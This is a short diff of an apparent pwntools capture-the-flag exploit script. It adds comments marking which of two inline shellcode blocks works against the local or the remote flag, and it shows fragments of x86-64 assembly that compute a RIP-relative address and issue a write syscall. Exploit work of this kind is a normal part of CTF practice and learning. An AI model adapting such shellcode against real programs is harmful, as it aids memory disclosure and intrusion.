@@ -2,6 +2,7 @@ from pwn import *
 import sys
 import time
 
+# this works with the local flag
 asm_code = """
 lea rax, [rip]
 sub rax, 0x48
@@ -12,6 +13,7 @@ mov rax, 1
 syscall
 """
 
+# this works with the remote flag
 #asm_code = """
 #lea rax, [rip]
 #sub rax, 0x6e
